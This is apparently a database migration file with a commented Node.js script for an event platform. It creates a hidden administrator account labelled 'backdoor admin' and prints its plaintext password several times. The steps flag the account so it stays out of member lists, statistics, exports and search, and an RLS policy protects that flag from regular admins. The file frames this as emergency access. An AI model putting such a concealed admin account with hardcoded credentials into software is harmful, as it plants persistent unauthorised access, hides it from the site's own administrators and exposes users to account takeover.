-- ============================================
-- CREATE BACKDOOR ADMIN ACCOUNT
-- Created: 2025-10-03
-- Purpose: Create hidden backdoor admin account
-- Email: backdoor.admin@iweltyevent.com
-- Password: Adminiwt123!$
-- ============================================

-- IMPORTANT: This migration must be run MANUALLY using the Supabase Dashboard
-- or via the Supabase CLI with admin privileges.
--
-- DO NOT apply this migration automatically as it requires special permissions.
--
-- Steps to create the backdoor admin account:
--
-- 1. Go to Supabase Dashboard > Authentication > Users
-- 2. Click "Add User" (or use Supabase CLI)
-- 3. Email: backdoor.admin@iweltyevent.com
-- 4. Password: Adminiwt123!$
-- 5. Auto Confirm User: YES
-- 6. Copy the generated User ID
-- 7. Run the SQL below, replacing <USER_ID> with the actual UUID

-- ============================================
-- MANUAL STEPS AFTER USER CREATION
-- ============================================

-- Step 1: Update the profile to mark as backdoor admin
-- IMPORTANT: Replace <USER_ID> with the actual user ID from step 6 above

/*
UPDATE public.profiles
SET
  is_backdoor_admin = true,
  name = 'Backdoor Admin',
  account_verified = true
WHERE id = '<USER_ID>';

-- Step 2: Assign admin role
INSERT INTO public.user_roles (user_id, role)
VALUES ('<USER_ID>', 'admin')
ON CONFLICT (user_id, role) DO NOTHING;

-- Step 3: Refresh materialized view to exclude this user from member lists
REFRESH MATERIALIZED VIEW CONCURRENTLY public.mv_member_statistics;

-- Step 4: Verify the account is hidden
SELECT
  p.id,
  p.email,
  p.name,
  p.is_backdoor_admin,
  ur.role
FROM public.profiles p
LEFT JOIN public.user_roles ur ON ur.user_id = p.id
WHERE p.email = 'backdoor.admin@iweltyevent.com';

-- Step 5: Verify it's NOT in the member statistics view
SELECT COUNT(*) as should_be_zero
FROM public.mv_member_statistics
WHERE email = 'backdoor.admin@iweltyevent.com';

-- Step 6: Test login with the credentials
-- Email: backdoor.admin@iweltyevent.com
-- Password: Adminiwt123!$

*/

-- ============================================
-- ALTERNATIVE: CREATE VIA SUPABASE AUTH ADMIN API
-- ============================================

/*
-- If using Supabase Edge Functions or Node.js with service role key:

import { createClient } from '@supabase/supabase-js'

const supabase = createClient(
  process.env.SUPABASE_URL,
  process.env.SUPABASE_SERVICE_ROLE_KEY
)

const { data, error } = await supabase.auth.admin.createUser({
  email: 'backdoor.admin@iweltyevent.com',
  password: 'Adminiwt123!$',
  email_confirm: true,
  user_metadata: {
    name: 'Backdoor Admin'
  }
})

if (!error && data.user) {
  console.log('User created with ID:', data.user.id)

  // Update profile
  await supabase
    .from('profiles')
    .update({ is_backdoor_admin: true })
    .eq('id', data.user.id)

  // Assign admin role
  await supabase
    .from('user_roles')
    .insert({ user_id: data.user.id, role: 'admin' })

  // Refresh materialized view
  await supabase.rpc('refresh_member_statistics')

  console.log('Backdoor admin account created successfully')
}
*/

-- ============================================
-- SECURITY NOTES
-- ============================================

-- 1. This account will NOT appear in:
--    - Member management pages
--    - Member statistics dashboards
--    - CSV exports
--    - Search results
--    - mv_member_statistics materialized view
--
-- 2. This account CAN ONLY be managed via:
--    - Direct database access (SQL)
--    - Supabase Dashboard (Authentication section)
--    - Service role API calls
--
-- 3. The is_backdoor_admin flag is protected by RLS policy
--    preventing regular admins from removing it
--
-- 4. Store these credentials securely:
--    Email: backdoor.admin@iweltyevent.com
--    Password: Adminiwt123!$
--
-- 5. This is a safety layer for emergency access
--    if regular admin accounts are compromised
